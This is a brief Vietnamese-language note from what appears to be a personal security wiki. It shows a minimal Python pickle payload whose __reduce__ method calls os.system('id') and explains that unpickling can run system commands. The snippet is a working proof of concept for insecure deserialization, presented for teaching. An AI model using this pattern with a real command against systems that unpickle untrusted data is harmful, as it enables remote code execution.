---
title: Python Pickle Exploit Example
type: entity
related: [[Python Pickle Deserialization]]
---

Ví dụ payload Python pickle trong tài liệu:

```python
import pickle, os, base64
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
```

Payload này minh họa việc unpickling có thể gọi hàm hệ thống.